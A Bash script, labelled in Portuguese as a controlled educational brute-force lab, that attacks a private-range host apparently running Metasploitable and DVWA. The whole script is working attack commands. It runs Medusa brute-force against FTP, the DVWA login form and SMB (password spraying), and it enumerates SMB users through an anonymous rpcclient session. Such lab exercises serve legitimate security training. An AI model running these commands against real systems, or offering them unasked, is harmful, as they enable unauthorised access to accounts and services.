#!/bin/bash

echo "🔓 LABORATÓRIO DE FORÇA BRUTA - MEDUSA"
echo "⚠️  AMBIENTE CONTROLADO - FINS EDUCACIONAIS"
echo "=========================================="

# Configurações
TARGET="192.168.56.101"
USER_LIST="wordlists/common_users.txt"
PASS_LIST="wordlists/common_passwords.txt"

echo ""
echo "🎯 1. ATAQUE FTP - METASPLOITABLE"
echo "----------------------------------"
medusa -h $TARGET -U $USER_LIST -P $PASS_LIST -M ftp -t 2 -f

echo ""
echo "🌐 2. ATAQUE WEB - DVWA LOGIN"
echo "-----------------------------"
# Wordlist específica para DVWA
echo "admin" > dvwa_users.txt
echo "password" > dvwa_pass.txt
echo "123456" >> dvwa_pass.txt
echo "admin" >> dvwa_pass.txt

medusa -h $TARGET -U dvwa_users.txt -P dvwa_pass.txt -M http -m DIR:/dvwa/login.php -m FORM:'username^USER^&password^PASS^&Login^Login^' -m DENY-SIGNAL:"Login failed" -t 2 -f

echo ""
echo "💻 3. ENUMERAÇÃO SMB - USUÁRIOS"
echo "------------------------------"
echo "📋 Enumeração de usuários via RPC:"
rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null | grep -oP '\[.*?\]' | tr -d '[]'

echo ""
echo "🔑 4. PASSWORD SPRAYING SMB"
echo "---------------------------"
medusa -h $TARGET -U $USER_LIST -P $PASS_LIST -M smbnt -t 1 -f

echo ""
echo "✅ DEMONSTRAÇÃO CONCLUÍDA"
